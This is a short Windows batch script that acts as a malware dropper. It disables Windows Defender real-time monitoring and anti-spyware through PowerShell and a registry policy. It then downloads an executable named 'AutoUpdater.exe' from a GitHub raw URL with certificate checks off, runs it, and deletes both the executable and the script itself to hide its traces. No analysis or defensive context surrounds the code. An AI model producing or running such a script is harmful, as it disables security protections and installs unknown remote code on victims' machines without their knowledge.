@echo off
set "file=AutoUpdater.exe"
set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"
set "docPath=%USERPROFILE%"

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f

:: Download the file
curl -k -L %url% -o "%docPath%\%file%"

:: Execute the file
cd /d "%docPath%"
start /wait "" "%file%"

:: Delete the file
del /q "%file%"

:: Attempt to delete this script
start /b "" cmd /c del "%~f0"&exit
